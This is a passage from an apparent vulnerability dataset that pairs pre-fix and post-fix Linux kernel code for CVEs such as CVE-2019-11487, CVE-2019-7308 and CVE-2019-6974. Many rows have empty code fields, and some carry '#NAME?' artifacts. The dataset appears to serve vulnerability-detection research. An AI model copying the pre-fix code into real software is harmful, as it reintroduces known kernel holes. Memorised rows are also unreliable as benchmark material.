				 * Avoid to modify vma->vm_flags
				 * without locked ops while the
				 * coredump reads the vm_flags.
 */
 if (!mmget_still_valid(mm)) {
 /*
					 * Silently return ""count""
					 * like if get_task_mm()
					 * failed. FIXME: should this
					 * function have returned
					 * -ESRCH if get_task_mm()
					 * failed like if
					 * get_proc_task() fails?
 */
 up_write(&mm->mmap_sem);
 goto out_mm;
				}
 for (vma = mm->mmap; vma; vma = vma->vm_next) {
					vma->vm_flags &= ~VM_SOFTDIRTY;
 vma_set_page_prot(vma);

 /* the various vma->vm_userfaultfd_ctx still points to it */
 down_write(&mm->mmap_sem);
 /* no task can run (and in turn coredump) yet */
 VM_WARN_ON(!mmget_still_valid(mm));
 for (vma = mm->mmap; vma; vma = vma->vm_next)
 if (vma->vm_userfaultfd_ctx.ctx == release_new_ctx) {
				vma->vm_userfaultfd_ctx = NULL_VM_UFFD_CTX;
	 * taking the mmap_sem for writing.
 */
 down_write(&mm->mmap_sem);
 if (!mmget_still_valid(mm))
 goto skip_mm;
	prev = NULL;
 for (vma = mm->mmap; vma; vma = vma->vm_next) {
 cond_resched();
		vma->vm_flags = new_flags;
		vma->vm_userfaultfd_ctx = NULL_VM_UFFD_CTX;
	}
skip_mm:
 up_write(&mm->mmap_sem);
 mmput(mm);
wakeup:
 goto out;

 down_write(&mm->mmap_sem);
 if (!mmget_still_valid(mm))
 goto out_unlock;
	vma = find_vma_prev(mm, start, &prev);
 if (!vma)
 goto out_unlock;
 goto out;

 down_write(&mm->mmap_sem);
 if (!mmget_still_valid(mm))
 goto out_unlock;
	vma = find_vma_prev(mm, start, &prev);
 if (!vma)
 goto out_unlock;
 __mmdrop(mm);
}

/*
 * This has to be called after a get_task_mm()/mmget_not_zero()
 * followed by taking the mmap_sem for writing before modifying the
 * vmas or anything the coredump pretends not to change from under it.
 *
 * NOTE: find_extend_vma() called from GUP context is the only place
 * that can modify the ""mm"" (notably the vm_start/end) under mmap_sem
 * for reading and outside the context of the process, so it is also
 * the only case that holds the mmap_sem for reading that must call
 * this function. Generally if the mmap_sem is hold for reading
 * there's no need of this check after get_task_mm()/mmget_not_zero().
 *
 * This function can be obsoleted and the check can be removed, after
 * the coredump code will hold the mmap_sem for writing before
 * invoking the ->core_dump methods.
 */
static inline bool mmget_still_valid(struct mm_struct *mm)
{
 return likely(!mm->core_state);
}

/**
 * mmget() - Pin the address space associated with a &struct mm_struct.
 * @mm: The address space to pin.
#include <linux/moduleparam.h>
#include <linux/pkeys.h>
#include <linux/oom.h>
#include <linux/sched/mm.h>

#include <linux/uaccess.h>
#include <asm/cacheflush.h>
	vma = find_vma_prev(mm, addr, &prev);
 if (vma && (vma->vm_start <= addr))
 return vma;
 /* don't alter vm_end if the coredump is running */
 if (!prev || !mmget_still_valid(mm) || expand_stack(prev, addr))
 return NULL;
 if (prev->vm_flags & VM_LOCKED)
 populate_vma_page_range(prev, addr, prev->vm_end, NULL);
 return vma;
 if (!(vma->vm_flags & VM_GROWSDOWN))
 return NULL;
 /* don't alter vm_start if the coredump is running */
 if (!mmget_still_valid(mm))
 return NULL;
	start = vma->vm_start;
 if (expand_stack(vma, addr))
 return NULL;
"
2019,Overflow ,CVE-2019-11487,"}
#endif /* CONFIG_DEV_PAGEMAP_OPS */





static inline void get_page(struct page *page)
{
	page = compound_head(page);
 /*
	 * Getting a normal page or the head of a compound page
	 * requires to already have an elevated page->_refcount.
 */
 VM_BUG_ON_PAGE(page_ref_count(page) <= 0, page);
 page_ref_inc(page);
}

","}
#endif /* CONFIG_DEV_PAGEMAP_OPS */

/* 127: arbitrary random number, small enough to assemble well */
#define page_ref_zero_or_close_to_overflow(page) \
	((unsigned int) page_ref_count(page) + 127u <= 127u)

static inline void get_page(struct page *page)
{
	page = compound_head(page);
 /*
	 * Getting a normal page or the head of a compound page
	 * requires to already have an elevated page->_refcount.
 */
 VM_BUG_ON_PAGE(page_ref_zero_or_close_to_overflow(page), page);
 page_ref_inc(page);
}

"
2019,,CVE-2019-11486,"
config R3964
	tristate ""Siemens R3964 line discipline""
	depends on TTY
	---help---
	  This driver allows synchronous communication with devices using the
	  Siemens R3964 packet protocol. Unless you are dealing with special
","
config R3964
	tristate ""Siemens R3964 line discipline""
	depends on TTY && BROKEN
	---help---
	  This driver allows synchronous communication with devices using the
	  Siemens R3964 packet protocol. Unless you are dealing with special
"
2019,DoS ,CVE-2019-11479,,
2019,DoS ,CVE-2019-11478,,
2019,DoS Overflow ,CVE-2019-11477,,
2019,Bypass ,CVE-2019-11191,,
2019,Bypass ,CVE-2019-11190,,
2019,Bypass +Info ,CVE-2019-10639," */
 spinlock_t		rules_mod_lock;


 atomic64_t		cookie_gen;

 struct list_head	list;		/* list of network namespaces */
#ifndef __NET_NS_HASH_H__
#define __NET_NS_HASH_H__

#include <asm/cache.h>

struct net;

static inline u32 net_hash_mix(const struct net *net)
{
#ifdef CONFIG_NET_NS
 return (u32)(((unsigned long)net) >> ilog2(sizeof(*net)));
#else
 return 0;
#endif
}
#endif

 refcount_set(&net->count, 1);
 refcount_set(&net->passive, 1);

	net->dev_base_seq = 1;
	net->user_ns = user_ns;
 idr_init(&net->netns_ids);
"," */
 spinlock_t		rules_mod_lock;

	u32			hash_mix;
 atomic64_t		cookie_gen;

 struct list_head	list;		/* list of network namespaces */
#ifndef __NET_NS_HASH_H__
#define __NET_NS_HASH_H__

#include <net/net_namespace.h>



static inline u32 net_hash_mix(const struct net *net)
{
 return net->hash_mix;




}
#endif

 refcount_set(&net->count, 1);
 refcount_set(&net->passive, 1);
 get_random_bytes(&net->hash_mix, sizeof(u32));
	net->dev_base_seq = 1;
	net->user_ns = user_ns;
 idr_init(&net->netns_ids);
"
2019,,CVE-2019-10638,"	u64 key[2];
} siphash_key_t;






u64 __siphash_aligned(const void *data, size_t len, const siphash_key_t *key);
#ifndef CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS
u64 __siphash_unaligned(const void *data, size_t len, const siphash_key_t *key);
#include <linux/uidgid.h>
#include <net/inet_frag.h>
#include <linux/rcupdate.h>


struct tcpm_hash_bucket;
struct ctl_table_header;
 unsigned int	ipmr_seq;	/* protected by rtnl_mutex */

 atomic_t	rt_genid;

};
#endif

void __ip_select_ident(struct net *net, struct iphdr *iph, int segs)
{
 static u32 ip_idents_hashrnd __read_mostly;
	u32 hash, id;

 net_get_random_once(&ip_idents_hashrnd, sizeof(ip_idents_hashrnd));




	hash = jhash_3words((__force u32)iph->daddr,
			    (__force u32)iph->saddr,
			    iph->protocol ^ net_hash_mix(net),
 ip_idents_hashrnd);
	id = ip_idents_reserve(hash, segs);
	iph->id = htons(id);
}
#include <net/secure_seq.h>
#include <linux/netfilter.h>

static u32 __ipv6_select_ident(struct net *net, u32 hashrnd,
 const struct in6_addr *dst,
 const struct in6_addr *src)
{







	u32 hash, id;

	hash = __ipv6_addr_jhash(dst, hashrnd);
	hash = __ipv6_addr_jhash(src, hash);
	hash ^= net_hash_mix(net);




 /* Treat id of 0 as unset and if we get 0 back from ip_idents_reserve,
	 * set the hight order instead thus minimizing possible future
 */
__be32 ipv6_proxy_select_ident(struct net *net, struct sk_buff *skb)
{
 static u32 ip6_proxy_idents_hashrnd __read_mostly;
 struct in6_addr buf[2];
 struct in6_addr *addrs;
	u32 id;
 if (!addrs)
 return 0;

 net_get_random_once(&ip6_proxy_idents_hashrnd,
 sizeof(ip6_proxy_idents_hashrnd));

	id = __ipv6_select_ident(net, ip6_proxy_idents_hashrnd,
				 &addrs[1], &addrs[0]);
 return htonl(id);
}
EXPORT_SYMBOL_GPL(ipv6_proxy_select_ident);
 const struct in6_addr *daddr,
 const struct in6_addr *saddr)
{
 static u32 ip6_idents_hashrnd __read_mostly;
	u32 id;

 net_get_random_once(&ip6_idents_hashrnd, sizeof(ip6_idents_hashrnd));

	id = __ipv6_select_ident(net, ip6_idents_hashrnd, daddr, saddr);
 return htonl(id);
}
EXPORT_SYMBOL(ipv6_select_ident);
","	u64 key[2];
} siphash_key_t;

static inline bool siphash_key_is_zero(const siphash_key_t *key)
{
 return !(key->key[0] | key->key[1]);
}

u64 __siphash_aligned(const void *data, size_t len, const siphash_key_t *key);
#ifndef CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS
u64 __siphash_unaligned(const void *data, size_t len, const siphash_key_t *key);
#include <linux/uidgid.h>
#include <net/inet_frag.h>
#include <linux/rcupdate.h>
#include <linux/siphash.h>

struct tcpm_hash_bucket;
struct ctl_table_header;
 unsigned int	ipmr_seq;	/* protected by rtnl_mutex */

 atomic_t	rt_genid;
 siphash_key_t	ip_id_key;
};
#endif

void __ip_select_ident(struct net *net, struct iphdr *iph, int segs)
{

	u32 hash, id;

 /* Note the following code is not safe, but this is okay. */
 if (unlikely(siphash_key_is_zero(&net->ipv4.ip_id_key)))
 get_random_bytes(&net->ipv4.ip_id_key,
 sizeof(net->ipv4.ip_id_key));

	hash = siphash_3u32((__force u32)iph->daddr,
			    (__force u32)iph->saddr,
			    iph->protocol,
 &net->ipv4.ip_id_key);
	id = ip_idents_reserve(hash, segs);
	iph->id = htons(id);
}
#include <net/secure_seq.h>
#include <linux/netfilter.h>

static u32 __ipv6_select_ident(struct net *net,
 const struct in6_addr *dst,
 const struct in6_addr *src)
{
 const struct {
 struct in6_addr dst;
 struct in6_addr src;
	} __aligned(SIPHASH_ALIGNMENT) combined = {
		.dst = *dst,
		.src = *src,
	};
	u32 hash, id;

 /* Note the following code is not safe, but this is okay. */
 if (unlikely(siphash_key_is_zero(&net->ipv4.ip_id_key)))
 get_random_bytes(&net->ipv4.ip_id_key,
 sizeof(net->ipv4.ip_id_key));

	hash = siphash(&combined, sizeof(combined), &net->ipv4.ip_id_key);

 /* Treat id of 0 as unset and if we get 0 back from ip_idents_reserve,
	 * set the hight order instead thus minimizing possible future
 */
__be32 ipv6_proxy_select_ident(struct net *net, struct sk_buff *skb)
{

 struct in6_addr buf[2];
 struct in6_addr *addrs;
	u32 id;
 if (!addrs)
 return 0;

	id = __ipv6_select_ident(net, &addrs[1], &addrs[0]);




 return htonl(id);
}
EXPORT_SYMBOL_GPL(ipv6_proxy_select_ident);
 const struct in6_addr *daddr,
 const struct in6_addr *saddr)
{

	u32 id;

	id = __ipv6_select_ident(net, daddr, saddr);


 return htonl(id);
}
EXPORT_SYMBOL(ipv6_select_ident);
"
2019,Dir. Trav. ,CVE-2019-10220,,
2019,,CVE-2019-10207,,
2019,,CVE-2019-10142,,
2019,DoS ,CVE-2019-10140,,
2019,Overflow Mem. Corr. ,CVE-2019-10126,,
2019,,CVE-2019-10125,,
2019,DoS ,CVE-2019-9857,,
2019,,CVE-2019-9213,"{
 struct mm_struct *mm = vma->vm_mm;
 struct vm_area_struct *prev;
 int error;

	address &= PAGE_MASK;
	error = security_mmap_addr(address);
 if (error)
 return error;

 /* Enforce stack_guard_gap */
	prev = vma->vm_prev;
","{
 struct mm_struct *mm = vma->vm_mm;
 struct vm_area_struct *prev;
 int error = 0;

	address &= PAGE_MASK;
 if (address < mmap_min_addr)
 return -EPERM;


 /* Enforce stack_guard_gap */
	prev = vma->vm_prev;
"
2019,,CVE-2019-9162,"int snmp_version(void *context, size_t hdrlen, unsigned char tag,
 const void *data, size_t datalen)
{


 if (*(unsigned char *)data > 1)
 return -ENOTSUPP;
 return 1;
 const void *data, size_t datalen)
{
 struct snmp_ctx *ctx = (struct snmp_ctx *)context;
	__be32 *pdata = (__be32 *)data;




 if (*pdata == ctx->from) {
 pr_debug(""%s: %pI4 to %pI4\n"", __func__,
			 (void *)&ctx->from, (void *)&ctx->to);
","int snmp_version(void *context, size_t hdrlen, unsigned char tag,
 const void *data, size_t datalen)
{
 if (datalen != 1)
 return -EINVAL;
 if (*(unsigned char *)data > 1)
 return -ENOTSUPP;
 return 1;
 const void *data, size_t datalen)
{
 struct snmp_ctx *ctx = (struct snmp_ctx *)context;
	__be32 *pdata;

 if (datalen != 4)
 return -EINVAL;
	pdata = (__be32 *)data;
 if (*pdata == ctx->from) {
 pr_debug(""%s: %pI4 to %pI4\n"", __func__,
			 (void *)&ctx->from, (void *)&ctx->to);
"
2019,Exec Code ,CVE-2019-9003,"static void free_user(struct kref *ref)
{
 struct ipmi_user *user = container_of(ref, struct ipmi_user, refcount);

 kfree(user);
}

{
 _ipmi_destroy_user(user);

 cleanup_srcu_struct(&user->release_barrier);
 kref_put(&user->refcount, free_user);

 return 0;
","static void free_user(struct kref *ref)
{
 struct ipmi_user *user = container_of(ref, struct ipmi_user, refcount);
 cleanup_srcu_struct(&user->release_barrier);
 kfree(user);
}

{
 _ipmi_destroy_user(user);


 kref_put(&user->refcount, free_user);

 return 0;
"
2019,DoS ,CVE-2019-8980,,
2019,,CVE-2019-8956,,
2019,,CVE-2019-8912,,
2019,,CVE-2019-7308," /* call stack tracking */
 struct bpf_func_state *frame[MAX_CALL_FRAMES];
	u32 curframe;

};

#define bpf_get_spilled_reg(slot, frame)				\
 struct bpf_verifier_state_list *next;
};








struct bpf_insn_aux_data {
 union {
 enum bpf_reg_type ptr_type;	/* pointer type for load/store insns */
 unsigned long map_state;	/* pointer/poison value for maps */
		s32 call_imm;			/* saved imm field of call insn */

	};
 int ctx_field_size; /* the ctx field size for load insn, maybe 0 */
 int sanitize_stack_off; /* stack slot to be cleared */
 bool seen; /* this insn was processed by the verifier */

};

#define MAX_USED_MAPS 64 /* max number of maps accessed by one eBPF program */
 free_func_state(dst_state->frame[i]);
		dst_state->frame[i] = NULL;
	}

	dst_state->curframe = src->curframe;
 for (i = 0; i <= src->curframe; i++) {
		dst = dst_state->frame[i];
}

static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,
 int insn_idx, int prev_insn_idx)

{
 struct bpf_verifier_state *cur = env->cur_state;
 struct bpf_verifier_stack_elem *elem;
	err = copy_verifier_state(&elem->st, cur);
 if (err)
 goto err;

 if (env->stack_size > BPF_COMPLEXITY_LIMIT_STACK) {
 verbose(env, ""BPF program is too complex\n"");
 goto err;
 return true;
}

































































































/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.
 * Caller should also handle BPF_MOV case separately.
 * If we return -EACCES, caller may want to try again treating pointer as a
	    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;
	u32 dst = insn->dst_reg, src = insn->src_reg;
	u8 opcode = BPF_OP(insn->code);


	dst_reg = &regs[dst];


 switch (opcode) {
 case BPF_ADD:





 /* We can take a fixed offset as long as it doesn't overflow
		 * the s32 'off' field
 */
		}
 break;
 case BPF_SUB:





 if (dst_reg == off_reg) {
 /* scalar -= pointer.  Creates an unknown scalar */
 verbose(env, ""R%d tried to subtract pointer from scalar\n"",
		}
	}

	other_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx);

 if (!other_branch)
 return -EFAULT;
	other_branch_regs = other_branch->frame[other_branch->curframe]->regs;
 if (old->curframe != cur->curframe)
 return false;







 /* for states to be equal callsites have to be the same
	 * and all frame states need to be equivalent
 */
 if (!state)
 return -ENOMEM;
	state->curframe = 0;

	state->frame[0] = kzalloc(sizeof(struct bpf_func_state), GFP_KERNEL);
 if (!state->frame[0]) {
 kfree(state);
 /* found equivalent state, can prune the search */
 if (env->log.level) {
 if (do_print_state)
 verbose(env, ""\nfrom %d to %d: safe\n"",
						env->prev_insn_idx, env->insn_idx);


 else
 verbose(env, ""%d: safe\n"", env->insn_idx);
			}
 if (env->log.level > 1)
 verbose(env, ""%d:"", env->insn_idx);
 else
 verbose(env, ""\nfrom %d to %d:"",
					env->prev_insn_idx, env->insn_idx);


 print_verifier_state(env, state->frame[state->curframe]);
			do_print_state = false;
		}
 continue;
		}




















































 if (insn->code != (BPF_JMP | BPF_CALL))
 continue;
 if (insn->src_reg == BPF_PSEUDO_CALL)
"," /* call stack tracking */
 struct bpf_func_state *frame[MAX_CALL_FRAMES];
	u32 curframe;
 bool speculative;
};

#define bpf_get_spilled_reg(slot, frame)				\
 struct bpf_verifier_state_list *next;
};

/* Possible states for alu_state member. */
#define BPF_ALU_SANITIZE_SRC 1U
#define BPF_ALU_SANITIZE_DST 2U
#define BPF_ALU_NEG_VALUE		(1U << 2)
#define BPF_ALU_SANITIZE		(BPF_ALU_SANITIZE_SRC | \
					 BPF_ALU_SANITIZE_DST)

struct bpf_insn_aux_data {
 union {
 enum bpf_reg_type ptr_type;	/* pointer type for load/store insns */
 unsigned long map_state;	/* pointer/poison value for maps */
		s32 call_imm;			/* saved imm field of call insn */
		u32 alu_limit;			/* limit for add/sub register with pointer */
	};
 int ctx_field_size; /* the ctx field size for load insn, maybe 0 */
 int sanitize_stack_off; /* stack slot to be cleared */
 bool seen; /* this insn was processed by the verifier */
	u8 alu_state; /* used in combination with alu_limit */
};

#define MAX_USED_MAPS 64 /* max number of maps accessed by one eBPF program */
 free_func_state(dst_state->frame[i]);
		dst_state->frame[i] = NULL;
	}
	dst_state->speculative = src->speculative;
	dst_state->curframe = src->curframe;
 for (i = 0; i <= src->curframe; i++) {
		dst = dst_state->frame[i];
}

static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,
 int insn_idx, int prev_insn_idx,
 bool speculative)
{
 struct bpf_verifier_state *cur = env->cur_state;
 struct bpf_verifier_stack_elem *elem;
	err = copy_verifier_state(&elem->st, cur);
 if (err)
 goto err;
	elem->st.speculative |= speculative;
 if (env->stack_size > BPF_COMPLEXITY_LIMIT_STACK) {
 verbose(env, ""BPF program is too complex\n"");
 goto err;
 return true;
}

static struct bpf_insn_aux_data *cur_aux(struct bpf_verifier_env *env)
{
 return &env->insn_aux_data[env->insn_idx];
}

static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
			      u32 *ptr_limit, u8 opcode, bool off_is_neg)
{
 bool mask_to_left = (opcode == BPF_ADD &&  off_is_neg) ||
			    (opcode == BPF_SUB && !off_is_neg);
	u32 off;

 switch (ptr_reg->type) {
 case PTR_TO_STACK:
		off = ptr_reg->off + ptr_reg->var_off.value;
 if (mask_to_left)
			*ptr_limit = MAX_BPF_STACK + off;
 else
			*ptr_limit = -off;
 return 0;
 case PTR_TO_MAP_VALUE:
 if (mask_to_left) {
			*ptr_limit = ptr_reg->umax_value + ptr_reg->off;
		} else {
			off = ptr_reg->smin_value + ptr_reg->off;
			*ptr_limit = ptr_reg->map_ptr->value_size - off;
		}
 return 0;
 default:
 return -EINVAL;
	}
}

static int sanitize_ptr_alu(struct bpf_verifier_env *env,
 struct bpf_insn *insn,
 const struct bpf_reg_state *ptr_reg,
 struct bpf_reg_state *dst_reg,
 bool off_is_neg)
{
 struct bpf_verifier_state *vstate = env->cur_state;
 struct bpf_insn_aux_data *aux = cur_aux(env);
 bool ptr_is_dst_reg = ptr_reg == dst_reg;
	u8 opcode = BPF_OP(insn->code);
	u32 alu_state, alu_limit;
 struct bpf_reg_state tmp;
 bool ret;

 if (env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K)
 return 0;

 /* We already marked aux for masking from non-speculative
	 * paths, thus we got here in the first place. We only care
	 * to explore bad access from here.
 */
 if (vstate->speculative)
 goto do_sim;

	alu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : 0;
	alu_state |= ptr_is_dst_reg ?
		     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;

 if (retrieve_ptr_limit(ptr_reg, &alu_limit, opcode, off_is_neg))
 return 0;

 /* If we arrived here from different branches with different
	 * limits to sanitize, then this won't work.
 */
 if (aux->alu_state &&
	    (aux->alu_state != alu_state ||
	     aux->alu_limit != alu_limit))
 return -EACCES;

 /* Corresponding fixup done in fixup_bpf_calls(). */
	aux->alu_state = alu_state;
	aux->alu_limit = alu_limit;

do_sim:
 /* Simulate and find potential out-of-bounds access under
	 * speculative execution from truncation as a result of
	 * masking when off was not within expected range. If off
	 * sits in dst, then we temporarily need to move ptr there
	 * to simulate dst (== 0) +/-= ptr. Needed, for example,
	 * for cases where we use K-based arithmetic in one direction
	 * and truncated reg-based in the other in order to explore
	 * bad access.
 */
 if (!ptr_is_dst_reg) {
		tmp = *dst_reg;
		*dst_reg = *ptr_reg;
	}
	ret = push_stack(env, env->insn_idx + 1, env->insn_idx, true);
 if (!ptr_is_dst_reg)
		*dst_reg = tmp;
 return !ret ? -EFAULT : 0;
}

/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off.
 * Caller should also handle BPF_MOV case separately.
 * If we return -EACCES, caller may want to try again treating pointer as a
	    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;
	u32 dst = insn->dst_reg, src = insn->src_reg;
	u8 opcode = BPF_OP(insn->code);
 int ret;

	dst_reg = &regs[dst];


 switch (opcode) {
 case BPF_ADD:
		ret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);
 if (ret < 0) {
 verbose(env, ""R%d tried to add from different maps or paths\n"", dst);
 return ret;
		}
 /* We can take a fixed offset as long as it doesn't overflow
		 * the s32 'off' field
 */
		}
 break;
 case BPF_SUB:
		ret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);
 if (ret < 0) {
 verbose(env, ""R%d tried to sub from different maps or paths\n"", dst);
 return ret;
		}
 if (dst_reg == off_reg) {
 /* scalar -= pointer.  Creates an unknown scalar */
 verbose(env, ""R%d tried to subtract pointer from scalar\n"",
		}
	}

	other_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx,
 false);
 if (!other_branch)
 return -EFAULT;
	other_branch_regs = other_branch->frame[other_branch->curframe]->regs;
 if (old->curframe != cur->curframe)
 return false;

 /* Verification state from speculative execution simulation
	 * must never prune a non-speculative execution one.
 */
 if (old->speculative && !cur->speculative)
 return false;

 /* for states to be equal callsites have to be the same
	 * and all frame states need to be equivalent
 */
 if (!state)
 return -ENOMEM;
	state->curframe = 0;
	state->speculative = false;
	state->frame[0] = kzalloc(sizeof(struct bpf_func_state), GFP_KERNEL);
 if (!state->frame[0]) {
 kfree(state);
 /* found equivalent state, can prune the search */
 if (env->log.level) {
 if (do_print_state)
 verbose(env, ""\nfrom %d to %d%s: safe\n"",
						env->prev_insn_idx, env->insn_idx,
						env->cur_state->speculative ?
 "" (speculative execution)"" : """");
 else
 verbose(env, ""%d: safe\n"", env->insn_idx);
			}
 if (env->log.level > 1)
 verbose(env, ""%d:"", env->insn_idx);
 else
 verbose(env, ""\nfrom %d to %d%s:"",
					env->prev_insn_idx, env->insn_idx,
					env->cur_state->speculative ?
 "" (speculative execution)"" : """");
 print_verifier_state(env, state->frame[state->curframe]);
			do_print_state = false;
		}
 continue;
		}

 if (insn->code == (BPF_ALU64 | BPF_ADD | BPF_X) ||
		    insn->code == (BPF_ALU64 | BPF_SUB | BPF_X)) {
 const u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;
 const u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;
 struct bpf_insn insn_buf[16];
 struct bpf_insn *patch = &insn_buf[0];
 bool issrc, isneg;
			u32 off_reg;

			aux = &env->insn_aux_data[i + delta];
 if (!aux->alu_state)
 continue;

			isneg = aux->alu_state & BPF_ALU_NEG_VALUE;
			issrc = (aux->alu_state & BPF_ALU_SANITIZE) ==
				BPF_ALU_SANITIZE_SRC;

			off_reg = issrc ? insn->src_reg : insn->dst_reg;
 if (isneg)
				*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);
			*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);
			*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
			*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
			*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
			*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
 if (issrc) {
				*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,
							 off_reg);
				insn->src_reg = BPF_REG_AX;
			} else {
				*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,
							 BPF_REG_AX);
			}
 if (isneg)
				insn->code = insn->code == code_add ?
					     code_sub : code_add;
			*patch++ = *insn;
 if (issrc && isneg)
				*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);
			cnt = patch - insn_buf;

			new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);
 if (!new_prog)
 return -ENOMEM;

			delta    += cnt - 1;
			env->prog = prog = new_prog;
			insn      = new_prog->insnsi + i + delta;
 continue;
		}

 if (insn->code != (BPF_JMP | BPF_CALL))
 continue;
 if (insn->src_reg == BPF_PSEUDO_CALL)
"
2019,#NAME?,CVE-2019-7222,,
2019,,CVE-2019-7221,,
2019,,CVE-2019-6974," if (ops->init)
		ops->init(dev);


	ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
 if (ret < 0) {

 mutex_lock(&kvm->lock);
 list_del(&dev->vm_node);
 mutex_unlock(&kvm->lock);
		ops->destroy(dev);
 return ret;
	}

 kvm_get_kvm(kvm);
	cd->fd = ret;
 return 0;
}
"," if (ops->init)
		ops->init(dev);

 kvm_get_kvm(kvm);
	ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
 if (ret < 0) {
 kvm_put_kvm(kvm);
 mutex_lock(&kvm->lock);
 list_del(&dev->vm_node);
 mutex_unlock(&kvm->lock);
		ops->destroy(dev);
 return ret;
	}


	cd->fd = ret;
 return 0;
}
"
2019,,CVE-2019-5489," return 0;
}

/*
 * Later we can get more picky about what ""in core"" means precisely.
 * For now, simply check to see if the page is in the page cache,
 * and is up to date; i.e. that no page-in operation would be required
 * at this time if an application were to map and access this page.
 */
static unsigned char mincore_page(struct address_space *mapping, pgoff_t pgoff)
{
 unsigned char present = 0;
 struct page *page;

 /*
	 * When tmpfs swaps out a page from a file, any process mapping that
	 * file will not get a swp_entry_t in its pte, but rather it is like
	 * any other file mapping (ie. marked !present and faulted in with
	 * tmpfs's .fault). So swapped out tmpfs mappings are tested here.
 */
#ifdef CONFIG_SWAP
 if (shmem_mapping(mapping)) {
		page = find_get_entry(mapping, pgoff);
 /*
		 * shmem/tmpfs may return swap: account for swapcache
		 * page too.
 */
 if (xa_is_value(page)) {
 swp_entry_t swp = radix_to_swp_entry(page);
			page = find_get_page(swap_address_space(swp),
 swp_offset(swp));
		}
	} else
		page = find_get_page(mapping, pgoff);
#else
	page = find_get_page(mapping, pgoff);
#endif
 if (page) {
		present = PageUptodate(page);
 put_page(page);
	}

 return present;
}

static int __mincore_unmapped_range(unsigned long addr, unsigned long end,
 struct vm_area_struct *vma, unsigned char *vec)
{
 unsigned long nr = (end - addr) >> PAGE_SHIFT;
 int i;

 if (vma->vm_file) {
 pgoff_t pgoff;

		pgoff = linear_page_index(vma, addr);
 for (i = 0; i < nr; i++, pgoff++)
			vec[i] = mincore_page(vma->vm_file->f_mapping, pgoff);
	} else {
 for (i = 0; i < nr; i++)
			vec[i] = 0;
	}
 return nr;
}

static int mincore_unmapped_range(unsigned long addr, unsigned long end,
 struct mm_walk *walk)
{
	walk->private += __mincore_unmapped_range(addr, end,
						  walk->vma, walk->private);



 return 0;
}

 goto out;
	}


 if (pmd_trans_unstable(pmd)) {
 __mincore_unmapped_range(addr, end, vma, vec);
 goto out;
	}

 pte_t pte = *ptep;

 if (pte_none(pte))
 __mincore_unmapped_range(addr, addr + PAGE_SIZE,
						 vma, vec);
 else if (pte_present(pte))
			*vec = 1;
 else { /* pte is a swap entry */
 swp_entry_t entry = pte_to_swp_entry(pte);

 if (non_swap_entry(entry)) {
 /*
				 * migration or hwpoison entries are always
				 * uptodate
 */
				*vec = 1;
			} else {
#ifdef CONFIG_SWAP
				*vec = mincore_page(swap_address_space(entry),
 swp_offset(entry));
#else
 WARN_ON(1);
				*vec = 1;
#endif
			}
		}
		vec++;
	}
"," return 0;
}






























































static int mincore_unmapped_range(unsigned long addr, unsigned long end,
 struct mm_walk *walk)
{
 unsigned char *vec = walk->private;
 unsigned long nr = (end - addr) >> PAGE_SHIFT;

 memset(vec, 0, nr);
	walk->private += nr;
 return 0;
}

 goto out;
	}

 /* We'll consider a THP page under construction to be there */
 if (pmd_trans_unstable(pmd)) {
 memset(vec, 1, nr);
 goto out;
	}

 pte_t pte = *ptep;

 if (pte_none(pte))
			*vec = 0;

 else if (pte_present(pte))
			*vec = 1;
 else { /* pte is a swap entry */
 swp_entry_t entry = pte_to_swp_entry(pte);

 /*
			 * migration or hwpoison entries are always
			 * uptodate
 */
			*vec = !!non_swap_entry(entry);










		}
		vec++;
	}
"
2019,,CVE-2019-5108,,
2019,Bypass ,CVE-2019-3901,,
2019,,CVE-2019-3900,,
2019,DoS ,CVE-2019-3896,,
2019,,CVE-2019-3887,,
2019,DoS ,CVE-2019-3882,,
2019,DoS ,CVE-2019-3874,,
2019,,CVE-2019-3846,,
2019,Exec Code Mem. Corr. ,CVE-2019-3837,,
2019,DoS ,CVE-2019-3819,,
2019,,CVE-2019-3701,,
2019,#NAME?,CVE-2019-3460,,
2019,#NAME?,CVE-2019-3459,,
2020,,CVE-2019-3016,,
2018,,CVE-2018-1000204,"		num = (rem_sz > scatter_elem_sz_prev) ?
			scatter_elem_sz_prev : rem_sz;

		schp->pages[k] = alloc_pages(gfp_mask, order);
 if (!schp->pages[k])
 goto out;

","		num = (rem_sz > scatter_elem_sz_prev) ?
			scatter_elem_sz_prev : rem_sz;

		schp->pages[k] = alloc_pages(gfp_mask | __GFP_ZERO, order);
 if (!schp->pages[k])
 goto out;

"
2018,,CVE-2018-1000200,,
2018,Exec Code Overflow Mem. Corr. ,CVE-2018-1000199,,
2018,,CVE-2018-1000028,,
2018,,CVE-2018-1000026,,
